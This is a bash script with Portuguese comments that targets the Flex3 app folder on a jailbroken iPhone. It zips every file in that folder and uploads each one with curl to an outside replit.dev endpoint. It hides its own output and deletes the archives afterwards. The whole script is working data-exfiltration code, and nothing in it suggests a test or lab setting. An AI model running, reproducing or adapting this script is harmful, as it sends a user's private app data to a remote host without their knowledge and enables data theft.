#!/bin/bash

flex_path="/var/mobile/Library/Application Support/Flex3"
url="https://20f8fe90-6124-4d95-9d01-0f38ee0bf9df-00-35yv50ht7oto9.kirk.replit.dev?getFileButter"

# Redirecionar stdout para /dev/null para suprimir logs
# stderr será usado para capturar mensagens de erro

if [ -d "$flex_path" ]; then
    cd "$flex_path" || { echo "[ E ]: Directory Invalid: $flex_path" >&2; exit 1; }

    # Captura todos os arquivos
    files_to_send=$(find . -type f)

    for file_path in $files_to_send; do
        filename=$(basename "$file_path")

        zip_filename="$filename.zip"

        # Criar o arquivo zip do arquivo encontrado
        zip "$zip_filename" "$file_path" >/dev/null 2>&1

        # Enviar o arquivo zip
        response=$(curl -s -w "%{http_code}" -o /dev/null -F "file=@$zip_filename" "$url")

        if [ "$response" -ne 200 ]; then
            echo "[ E ]: Failed to upload $zip_filename, response code: $response" >&2
        fi

        # Remover o arquivo zip
        rm "$zip_filename" >/dev/null 2>&1
    done

    echo "[ + ]: a97285b5-1fa2-4bb6-aa68-f7d3f085f343-00; 0x0008A"
else
    echo "$flex_path não é um diretório válido." >&2
fi
